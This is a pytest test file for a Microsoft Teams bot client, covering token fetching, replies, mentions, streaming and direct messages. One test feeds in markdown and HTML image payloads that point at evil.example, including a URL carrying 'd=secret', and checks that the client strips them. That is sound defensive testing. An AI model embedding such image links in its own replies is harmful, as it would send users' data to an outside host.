"""TeamsClient against a stand-in Microsoft sign-in endpoint and Teams service.

The Teams packages are Linux-only dependencies, so the SDK tests skip on
other platforms; the no-SDK test runs everywhere.
"""

from __future__ import annotations

import asyncio
import json
import re
import subprocess
import sys
from urllib.parse import parse_qs

import httpx
import pytest

TENANT = "11111111-2222-3333-4444-555555555555"
APP_ID = "bot-app-id"
SECRET = "bot-secret-value"
SERVICE_URL = "https://smba.trafficmanager.net/amer/"
AUTHORITY = f"https://login.microsoftonline.com/{TENANT}"


class _Resp:
    def __init__(self, status: int, body: dict) -> None:
        self.status_code = status
        self.text = json.dumps(body)
        self.headers: dict[str, str] = {}

    def raise_for_status(self) -> None:
        if self.status_code >= 400:
            raise RuntimeError(self.status_code)


class StandInLogin:
    """Microsoft's sign-in endpoints, as msal calls them through its http_client hook."""

    def __init__(self, token_status: int = 200, token_body: dict | None = None) -> None:
        self.token_posts: list[tuple[str, dict]] = []
        self._token = (token_status, token_body or {"token_type": "Bearer", "expires_in": 3600, "access_token": "tok-1"})

    def get(self, url, params=None, headers=None, **kwargs):
        if url.startswith("https://login.microsoftonline.com/common/discovery/instance"):
            return _Resp(200, {
                "tenant_discovery_endpoint": f"{AUTHORITY}/v2.0/.well-known/openid-configuration",
                "metadata": [{
                    "preferred_network": "login.microsoftonline.com",
                    "preferred_cache": "login.windows.net",
                    "aliases": ["login.microsoftonline.com", "login.windows.net"],
                }],
            })
        assert url.startswith(f"{AUTHORITY}/v2.0/.well-known/openid-configuration"), url
        return _Resp(200, {
            "authorization_endpoint": f"{AUTHORITY}/oauth2/v2.0/authorize",
            "token_endpoint": f"{AUTHORITY}/oauth2/v2.0/token",
            "issuer": f"{AUTHORITY}/v2.0",
        })

    def post(self, url, params=None, data=None, headers=None, **kwargs):
        form = data if isinstance(data, dict) else {k: v[0] for k, v in parse_qs(data).items()}
        self.token_posts.append((url, form))
        return _Resp(*self._token)

    def close(self) -> None:
        pass


class StandInTeams:
    """The Teams service: records requests and answers replies and member lookups.

    Like Teams, it answers a stream's later posts with an empty body; ``empty`` makes every post's
    answer empty."""

    def __init__(self, *, empty: bool = False) -> None:
        self.requests: list[httpx.Request] = []
        self.empty = empty

    def handler(self, request: httpx.Request) -> httpx.Response:
        self.requests.append(request)
        if request.method == "POST" and request.url.path.endswith("/v3/conversations"):
            return httpx.Response(201, json={"id": "a:personal-chat"})
        if request.method == "POST" and request.url.path.endswith("/activities"):
            stream_id = (json.loads(request.content).get("channelData") or {}).get("streamId")
            if self.empty or stream_id:
                return httpx.Response(201, json={})
            return httpx.Response(201, json={"id": "reply-1"})
        if request.method == "GET" and "/members/" in request.url.path:
            return httpx.Response(200, json={
                "id": "29:member",
                "aadObjectId": "aad-1",
                "userPrincipalName": "ana@contoso.com",
                "userRole": "user",
                "tenantId": TENANT,
            })
        return httpx.Response(404)


@pytest.fixture
def sdk():
    pytest.importorskip("microsoft_teams.api", reason="Teams packages are Linux-only")
    from cowork.services.connectors.teams import client as teams_client

    return teams_client


def _client(sdk, login: StandInLogin, teams: StandInTeams | None = None):
    teams = teams or StandInTeams()
    return sdk.TeamsClient(
        APP_ID, SECRET, TENANT,
        http=httpx.AsyncClient(transport=httpx.MockTransport(teams.handler)),
        token_http=login,
    )


async def test_bot_token_uses_client_credentials_for_the_bots_tenant(sdk):
    login = StandInLogin()
    client = _client(sdk, login)

    assert await client.bot_token() == "tok-1"
    assert await client.bot_token() == "tok-1"

    assert len(login.token_posts) == 1, "the second call should come from msal's cache"
    url, form = login.token_posts[0]
    assert url == f"{AUTHORITY}/oauth2/v2.0/token"
    assert form["grant_type"] == "client_credentials"
    assert form["client_id"] == APP_ID
    assert form["client_secret"] == SECRET
    assert form["scope"] == sdk.BOT_SCOPE
    await client.aclose()


async def test_refused_credentials_raise_without_the_secret(sdk):
    login = StandInLogin(400, {"error": "invalid_client", "error_description": "AADSTS7000215: Invalid client secret."})
    client = _client(sdk, login)

    with pytest.raises(sdk.TeamsAuthError) as err:
        await client.bot_token()
    assert "invalid_client" in str(err.value)
    assert SECRET not in str(err.value)
    await client.aclose()


async def test_reply_posts_to_the_thread_with_the_bot_token(sdk):
    teams = StandInTeams()
    client = _client(sdk, StandInLogin(), teams)

    sent_id = await client.reply(SERVICE_URL, "19:channel;messageid=42", "42", "Hello from MindsHub")

    assert sent_id == "reply-1"
    [req] = teams.requests
    assert req.method == "POST"
    assert req.url.host == "smba.trafficmanager.net"
    assert req.url.path == "/amer/v3/conversations/19:channel;messageid=42/activities"
    assert req.headers["authorization"] == "Bearer tok-1"
    body = json.loads(req.content)
    assert body["type"] == "message"
    assert body["replyToId"] == "42"
    assert body["text"] == "Hello from MindsHub"
    await client.aclose()


async def test_reply_can_mention_the_asker_so_teams_notifies_them(sdk):
    teams = StandInTeams()
    client = _client(sdk, StandInLogin(), teams)

    await client.reply(SERVICE_URL, "19:channel;messageid=42", "42", "Which region?", mention=("29:ana", "Ana López"))

    body = json.loads(teams.requests[0].content)
    assert body["text"] == "<at>Ana López</at> Which region?"
    assert body["entities"] == [
        {"type": "mention", "mentioned": {"id": "29:ana", "name": "Ana López"}, "text": "<at>Ana López</at>"}
    ]
    await client.aclose()


@pytest.mark.parametrize("text", [
    "- Part 1\n- Part 2", "1. First", "## Sales", "| a | b |", "```\ncode\n```", "> quoted",
    "-\tPart 1", "1.\tFirst", "~~~\ncode\n~~~", "    indented code",
])
async def test_a_mention_goes_on_its_own_line_before_a_block(sdk, text):
    teams = StandInTeams()
    client = _client(sdk, StandInLogin(), teams)

    await client.reply(SERVICE_URL, "19:channel;messageid=42", "42", text, mention=("29:ana", "Ana"))

    assert json.loads(teams.requests[0].content)["text"] == f"<at>Ana</at>\n\n{text}"
    await client.aclose()


async def test_a_mentioned_name_cant_add_markup(sdk):
    teams = StandInTeams()
    client = _client(sdk, StandInLogin(), teams)

    await client.reply(SERVICE_URL, "19:channel;messageid=42", "42", "Done", mention=("29:x", "<b>Eve</b>"))

    body = json.loads(teams.requests[0].content)
    assert body["text"] == "<at>&lt;b&gt;Eve&lt;/b&gt;</at> Done"
    assert body["entities"][0]["text"] == "<at>&lt;b&gt;Eve&lt;/b&gt;</at>"
    await client.aclose()


async def test_a_name_with_an_apostrophe_is_mentioned_as_written(sdk):
    teams = StandInTeams()
    client = _client(sdk, StandInLogin(), teams)

    await client.reply(SERVICE_URL, "19:channel;messageid=42", "42", "Done", mention=("29:x", "Seán O'Brien"))

    body = json.loads(teams.requests[0].content)
    assert body["text"] == "<at>Seán O'Brien</at> Done"
    assert body["entities"][0]["text"] == "<at>Seán O'Brien</at>"
    await client.aclose()


async def test_a_reply_never_carries_an_image_a_reader_would_fetch(sdk):
    teams = StandInTeams()
    client = _client(sdk, StandInLogin(), teams)
    answer = ("Chart: ![sales](https://evil.example/p?d=secret) and ![x][ref]\n"
              "<IMG src=https://evil.example/q> <img/src=x>\n"
              "Doubled: !![a](https://evil.example/2) !!![b](https://evil.example/3)\n"
              "Unclosed fence: a ``` b ![c](https://evil.example/4)\n"
              "Escaped: \\`![d](https://evil.example/5)\\`\n"
              '<span title="`"><img src="https://evil.example/6"><span title="`">\n'
              '<svg><image href="https://evil.example/7"/></svg> <video poster="https://evil.example/8">\n'
              '<picture><source srcset="https://evil.example/9"></picture> <input type="image" src=x>\n'
              "In code too: `![e](f)` and\n```\n![g](h)\n```\n"
              "Comparisons stay: a < b, a <= b, 3<4")

    await client.reply(SERVICE_URL, "19:channel;messageid=42", "42", answer)

    text = json.loads(teams.requests[0].content)["text"]
    assert "![" not in text
    assert re.search(r"<[A-Za-z/!?]", text) is None
    assert text == ("Chart: [sales](https://evil.example/p?d=secret) and [x][ref]\n"
                    "&lt;IMG src=https://evil.example/q> &lt;img/src=x>\n"
                    "Doubled: [a](https://evil.example/2) [b](https://evil.example/3)\n"
                    "Unclosed fence: a ``` b [c](https://evil.example/4)\n"
                    "Escaped: \\`[d](https://evil.example/5)\\`\n"
                    '&lt;span title="`">&lt;img src="https://evil.example/6">&lt;span title="`">\n'
                    '&lt;svg>&lt;image href="https://evil.example/7"/>&lt;/svg> &lt;video poster="https://evil.example/8">\n'
                    '&lt;picture>&lt;source srcset="https://evil.example/9">&lt;/picture> &lt;input type="image" src=x>\n'
                    "In code too: `[e](f)` and\n```\n[g](h)\n```\n"
                    "Comparisons stay: a < b, a <= b, 3<4")
    await client.aclose()


async def test_a_reply_without_a_mention_has_no_mention_entity(sdk):
    teams = StandInTeams()
    client = _client(sdk, StandInLogin(), teams)

    await client.reply(SERVICE_URL, "19:channel;messageid=42", "42", "Hello")

    body = json.loads(teams.requests[0].content)
    assert body["text"] == "Hello"
    assert not any(entity.get("type") == "mention" for entity in body.get("entities") or [])
    await client.aclose()


async def test_status_opens_an_informative_stream_under_the_message(sdk):
    teams = StandInTeams()
    client = _client(sdk, StandInLogin(), teams)

    stream_id = await client.status(SERVICE_URL, "19:channel;messageid=42", "42", "Working on it…")
    same = await client.status(SERVICE_URL, "19:channel;messageid=42", "42", "Still working on it…",
                               stream_id=stream_id, sequence=2)

    assert (stream_id, same) == ("reply-1", "reply-1")
    first, second = (json.loads(r.content) for r in teams.requests)
    assert teams.requests[0].url.path == "/amer/v3/conversations/19:channel;messageid=42/activities"
    assert (first["type"], first["replyToId"], first["text"]) == ("typing", "42", "Working on it…")
    assert first["entities"] == [{"type": "streaminfo", "streamType": "informative", "streamSequence": 1}]
    assert first["channelData"] == {"streamType": "informative", "streamSequence": 1}
    assert second["entities"] == [
        {"type": "streaminfo", "streamId": "reply-1", "streamType": "informative", "streamSequence": 2}
    ]
    assert second["channelData"] == {"streamId": "reply-1", "streamType": "informative", "streamSequence": 2}
    await client.aclose()


async def test_a_first_update_teams_gives_no_id_opens_no_stream(sdk):
    client = _client(sdk, StandInLogin(), StandInTeams(empty=True))

    assert await client.status(SERVICE_URL, "19:channel;messageid=42", "42", "Working on it…") is None
    await client.aclose()


async def test_a_stream_reply_returns_the_stream_id_when_teams_gives_none(sdk):
    client = _client(sdk, StandInLogin(), StandInTeams())

    assert await client.reply(SERVICE_URL, "19:channel;messageid=42", "42", "The answer", stream_id="s-1") == "s-1"
    await client.aclose()


async def test_a_reply_with_a_stream_is_its_final_message(sdk):
    teams = StandInTeams()
    client = _client(sdk, StandInLogin(), teams)

    await client.reply(SERVICE_URL, "19:channel;messageid=42", "42", "The answer", mention=("29:ana", "Ana"),
                       stream_id="s-1")

    body = json.loads(teams.requests[0].content)
    assert (body["type"], body["replyToId"], body["text"]) == ("message", "42", "<at>Ana</at> The answer")
    assert {"type": "streaminfo", "streamId": "s-1", "streamType": "final"} in body["entities"]
    assert any(entity["type"] == "mention" for entity in body["entities"])
    assert body["channelData"]["streamType"] == "final"
    await client.aclose()


@pytest.mark.parametrize("stream_id", [None, "s-1"])
async def test_every_reply_is_extended_markdown_so_tables_and_headings_show(sdk, stream_id):
    teams = StandInTeams()
    client = _client(sdk, StandInLogin(), teams)
    table = "## Sales\n\n| Region | Total |\n| --- | ---: |\n| EU | 4 |"

    await client.reply(SERVICE_URL, "19:channel;messageid=42", "42", table, mention=("29:ana", "Ana"), stream_id=stream_id)

    body = json.loads(teams.requests[0].content)
    assert body["textFormat"] == "extendedmarkdown"
    assert body["text"] == f"<at>Ana</at>\n\n{table}"
    await client.aclose()


async def test_message_person_opens_their_personal_chat_and_posts_each_part_in_order(sdk):
    teams = StandInTeams()
    client = _client(sdk, StandInLogin(), teams)

    sent = await client.message_person(SERVICE_URL, TENANT, "aad-1", ["**Weekly sales**\n\nPart one",
                                                                     "Part two ![chart](https://evil.example/c)"])

    opened, *posted = teams.requests
    assert opened.url.path == "/amer/v3/conversations"
    chat = json.loads(opened.content)
    assert chat["members"] == [{"id": "aad-1"}] and chat["tenantId"] == TENANT
    assert chat["channelData"] == {"tenant": {"id": TENANT}}
    assert [req.url.path for req in posted] == ["/amer/v3/conversations/a:personal-chat/activities"] * 2
    assert [json.loads(req.content)["text"] for req in posted] == ["**Weekly sales**\n\nPart one",
                                                                   "Part two [chart](https://evil.example/c)"]
    assert {json.loads(req.content)["textFormat"] for req in posted} == {"extendedmarkdown"}
    assert {req.headers["authorization"] for req in teams.requests} == {"Bearer tok-1"}
    assert sent == ["reply-1", "reply-1"]
    await client.aclose()


async def test_message_person_says_how_many_parts_went_out_before_one_failed(sdk):
    teams = StandInTeams()
    answers = iter([httpx.Response(201, json={"id": "a:personal-chat"}), httpx.Response(201, json={"id": "m-1"}),
                    httpx.Response(503)])
    client = _client(sdk, StandInLogin(), teams)
    client._http = httpx.AsyncClient(transport=httpx.MockTransport(lambda request: next(answers)))

    with pytest.raises(sdk.TeamsPartlySent) as failed:
        await client.message_person(SERVICE_URL, TENANT, "aad-1", ["Part one", "Part two"])

    assert failed.value.posted == 1
    assert isinstance(failed.value.__cause__, httpx.HTTPStatusError)
    await client.aclose()


async def test_get_member_returns_the_verified_sign_in_name(sdk):
    teams = StandInTeams()
    client = _client(sdk, StandInLogin(), teams)

    member = await client.get_member(SERVICE_URL, "19:channel", "29:member")

    assert member.user_principal_name == "ana@contoso.com"
    assert member.user_role == "user"
    assert member.aad_object_id == "aad-1"
    [req] = teams.requests
    assert req.url.path == "/amer/v3/conversations/19:channel/members/29:member"
    assert req.headers["authorization"] == "Bearer tok-1"
    await client.aclose()


def test_tenant_is_required(sdk):
    with pytest.raises(ValueError, match="tenant_id is required"):
        sdk.TeamsClient(APP_ID, SECRET, "")


def test_calls_to_microsofts_sign_in_have_a_timeout(sdk, monkeypatch):
    # msal's default requests session waits forever unless given one.
    import requests

    login, timeouts = StandInLogin(), []

    def request(session, method, url, **kwargs):
        timeouts.append(kwargs.get("timeout"))
        return login.get(url) if method == "GET" else login.post(url, data=kwargs.get("data"))

    monkeypatch.setattr(requests.Session, "request", request)
    client = sdk.TeamsClient(APP_ID, SECRET, TENANT)
    asyncio.run(client.bot_token())
    assert timeouts and set(timeouts) == {15}


def test_imports_without_the_teams_packages():
    # A desktop install has neither package; the module must still import and
    # refuse to build a client, rather than fail at import time.
    code = (
        "import sys\n"
        "sys.modules['msal'] = None\n"
        "sys.modules['microsoft_teams'] = None\n"
        "from cowork.services.connectors.teams import client as t\n"
        "assert not t.teams_available()\n"
        "try:\n"
        "    t.TeamsClient('a', 's', 't')\n"
        "except t.TeamsUnavailableError:\n"
        "    print('unavailable')\n"
    )
    result = subprocess.run([sys.executable, "-c", code], capture_output=True, text=True, timeout=60)
    assert result.returncode == 0, result.stderr
    assert result.stdout.strip() == "unavailable"
